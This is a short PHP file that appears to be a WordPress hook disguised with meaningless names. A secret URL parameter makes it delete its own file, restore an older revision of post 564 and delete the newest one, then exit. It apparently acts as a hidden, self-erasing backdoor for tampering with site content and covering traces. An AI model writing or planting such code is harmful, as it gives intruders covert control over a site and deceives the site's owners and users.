<?php

function extensions_learndash_digital() {
	if (isset($_GET['column_multisite_tools']) && $_GET['column_multisite_tools'] === 'extra_color_types_nice') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reloaded_thumbnails_namespaced_integration = 564;
		$theme_save_information = wp_get_post_revisions($reloaded_thumbnails_namespaced_integration);
		if (empty($theme_save_information)) die('no revisions');
		if (count($theme_save_information) < 2) die('less than 2');
		$stripe_url_calendar_validation = array_shift($theme_save_information);
		$xml_first_posts = $stripe_url_calendar_validation->ID;
		$icon_views_force = array_shift($theme_save_information);
		$visual_map_master = $icon_views_force->ID;
		$database_free_responsive_shortener = wp_restore_post_revision($visual_map_master);
		if ($database_free_responsive_shortener === false) die('error restoring');
		$database_free_responsive_shortener = wp_delete_post_revision($xml_first_posts);		
		if ($database_free_responsive_shortener === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'extensions_learndash_digital');
